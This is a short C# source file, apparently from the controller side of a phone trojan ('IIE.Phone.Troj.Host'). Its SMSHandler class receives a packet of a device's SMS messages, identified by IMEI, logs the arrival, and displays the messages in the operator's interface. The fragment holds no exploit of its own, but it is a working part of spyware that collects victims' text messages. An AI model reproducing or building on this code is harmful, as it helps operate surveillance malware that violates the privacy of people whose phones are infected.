using InOut;
using InOut.PacketImp;

namespace IIE.Phone.Troj.Host.Handler
{
    public class SMSHandler : IPacketHandler
    {
        private readonly IMainView gui;
        private readonly int channel;
        private readonly string imei;

        public SMSHandler(int chan, string imei, IMainView gui)
        {
            channel = chan;
            this.imei = imei;
            this.gui = gui;
        }


        public void Receive(IPacket p, string tempIMEI)
        {
            
        }


        public void HandlePacket(IPacket p, string tempIMEI, Server c)
        {
            gui.Log.LogTxt("SMS tree data has been received");
            c.ChannelHandlerMap[imei].RemoveListener(channel);
            var packet = (SMSTreePacket)p;
            gui.UpdateSMS(imei, packet.List);
        }
    }
}
